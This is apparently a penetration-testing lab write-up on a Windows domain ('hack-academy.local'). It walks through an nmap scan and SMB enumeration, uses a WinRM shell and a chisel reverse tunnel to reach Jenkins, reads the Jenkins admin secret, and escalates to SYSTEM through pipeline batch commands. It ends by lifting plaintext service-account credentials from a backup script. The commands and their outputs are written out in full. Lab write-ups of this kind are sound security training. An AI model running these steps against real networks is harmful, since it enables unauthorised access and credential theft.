# NMAP

```
┌──(xmen㉿kali)-[~/chain2]
└─$ sudo nmap -sC -sV -p- -Pn --max-retries=1 10.0.2.27     
[sudo] password for xmen: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-13 22:52 -0400
Stats: 0:00:54 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 2.30% done; ETC: 23:31 (0:38:11 remaining)
Stats: 0:01:59 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 5.17% done; ETC: 23:30 (0:36:03 remaining)
Stats: 0:20:08 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 52.40% done; ETC: 23:31 (0:18:16 remaining)
Stats: 0:24:55 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 63.67% done; ETC: 23:31 (0:14:12 remaining)
Warning: 10.0.2.27 giving up on port because retransmission cap hit (1).
Stats: 0:39:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 35.71% done; ETC: 23:33 (0:01:37 remaining)
Nmap scan report for 10.0.2.27
Host is up (0.11s latency).
Not shown: 65521 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49690/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: CLIENT-2, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:39:8d:37 (Oracle VirtualBox virtual NIC)
| smb2-time: 
|   date: 2026-08-14T03:32:35
|_  start_date: N/A
|_clock-skew: -58s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2492.01 seconds
```

# SMB shares

```
└─$ netexec smb 10.0.2.27 -u 'hack-academy.local\kpatel' -p '100%Mary' --shares
SMB         10.0.2.27       445    CLIENT-2         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-2) (domain:hack-academy.local) (signing:False) (SMBv1:None)
SMB         10.0.2.27       445    CLIENT-2         [+] hack-academy.local\kpatel:100%Mary 
SMB         10.0.2.27       445    CLIENT-2         [*] Enumerated shares
SMB         10.0.2.27       445    CLIENT-2         Share           Permissions     Remark
SMB         10.0.2.27       445    CLIENT-2         -----           -----------     ------
SMB         10.0.2.27       445    CLIENT-2         ADMIN$                          Remote Admin
SMB         10.0.2.27       445    CLIENT-2         Backup-Scripts  READ            
SMB         10.0.2.27       445    CLIENT-2         C$                              Default share
SMB         10.0.2.27       445    CLIENT-2         IPC$            READ            Remote IPC
```

# Backup-Scripts

This share has only 3 files:

```
  backup-template.ps1                 A      262  Mon Apr 13 04:20:06 2026
  restore-guide.txt                   A      188  Mon Apr 13 04:20:06 2026
  schedule.txt                        A      147  Mon Apr 13 04:20:06 2026
```

The files contents are:
```
┌──(xmen㉿kali)-[~/chain2]
└─$ cat backup-template.ps1 
# Generic Backup Template
# Replace PLACEHOLDER values before use.

$Source = "$PLACEHOLDER_SOURCE"
$Dest   = "$PLACEHOLDER_DEST"
$User   = "$PLACEHOLDER_USER"
$Pass   = "$PLACEHOLDER_PASS"

Copy-Item -Path $Source -Destination $Dest -Recurse -Force
                                                                                                                                                                                                                                            
┌──(xmen㉿kali)-[~/chain2]
└─$ cat restore-guide.txt  
Restore Guide
=============
1. Identify the backup set to restore.
2. Copy files from the backup destination to the source.
3. Verify integrity.
4. Notify IT Operations on completion.
                                                                                                                                                                                                                                            
┌──(xmen㉿kali)-[~/chain2]
└─$ cat schedule.txt     
Backup Schedule
================
Full backup: nightly 2:00 AM
Incremental: every 6 hours
Retention: 30 days
Contact: it-ops@hack-academy.local
```

This points at maybe some scheduled job on this box that copies over files and notifies it-ops@hack-academy.local after.

# WinRM

Able to get a shell as the kpatel user here.

```
*Evil-WinRM* PS C:\Users\kpatel\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== =======
SeShutdownPrivilege           Shut down the system                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
SeTimeZonePrivilege           Change the time zone                 Enabled
```

Used wget with a local file URI piped into InvokeExpression to get PrivescCheck going from a local copy (uploaded via evil-winrm):

```
wget -useb file://C:/Users/kpatel/Documents/PrivescCheck.ps1|iex; Invoke-PrivescCheck -Extended -Audit
```

Remembering the jenkins password file for kpatel from earlier, I used chisel to set up a tunnel - using my admin svc_webapi session on client-1 as server and ran the chisel client on client-2 to tunnel 127.0.0.1:8080 back onto port 8080 on client-1.

On client-2: `*Evil-WinRM* PS C:\Users\kpatel\Documents> ./chisel.exe client 10.0.2.26:9000 R:8080:127.0.0.1:8080`

On client-1: `*Evil-WinRM* PS C:\Users\svc_webapi\Documents> ./chisel.exe server -p 9000 --reverse`

This let me access the jenkins webUI on port 8080 of 192.168.1.219

Also, the UI suggested the initialadminpassword was in a file:

```
*Evil-WinRM* PS C:\Users\kpatel\Documents> cd C:\ProgramData\Jenkins\.jenkins\secrets\
*Evil-WinRM* PS C:\ProgramData\Jenkins\.jenkins\secrets> dir


    Directory: C:\ProgramData\Jenkins\.jenkins\secrets


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         4/12/2026   4:16 PM             48 hudson.model.User.DIRNAMES
-a----         4/13/2026   1:19 AM             34 initialAdminPassword
-a----         4/12/2026   4:16 PM             32 jenkins.model.Jenkins.crumbSalt
-a----         8/15/2026   2:17 PM             48 jenkins.security.csp.ReportingContext.key
-a----         4/12/2026   4:16 PM            256 master.key


*Evil-WinRM* PS C:\ProgramData\Jenkins\.jenkins\secrets> type initialAdminPassword
495b5b02d07e418e8ef8ea31db16f893
```

Able to then log in on the webUI

This is jenkins version - Jenkins 2.541.3

From here I was able to set up a new project and a new pipeline step in it to run batch commands, piping output to out.txt in the kpatel user's documents directory.

Then I read and confirmed the whoami output over winrm as kpatel to see that jenkins was running (and so all pipeline batch commands too) as system on client 2

I then ran another batch command to add kpatel to localadmin

From here, using the winrm shell I was able to see the C:\Scripts\BackupSync.ps1 which is the filled out version of the one found in the DC SYSVOL share earlier.

BackupSync.ps1:

```
# BackupSync - Syncs finance data to DC backup share
# Runs nightly at 2:00 AM via scheduled task
# Maintained by IT Operations

$Username = "hack-academy\svc_admin"
$Password = "-Berlin-"
$SecurePass = ConvertTo-SecureString $Password -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential($Username, $SecurePass)

$SourcePath = "C:\Finance\Reports"
$DestPath   = "\\DC01\FinanceBackup"

try {
    Copy-Item -Path $SourcePath -Destination $DestPath -Recurse -Force -Credential $Cred
    Write-EventLog -LogName Application -Source "BackupSync" -EventId 1001 -EntryType Information -Message "Backup completed successfully."
} catch {
    Write-EventLog -LogName Application -Source "BackupSync" -EventId 1002 -EntryType Error -Message "Backup failed: $_"
}
```

This gives the svc_admin user and password:

```
svc_admin : -Berlin-
```


This let me get the proof.txt on the DC01
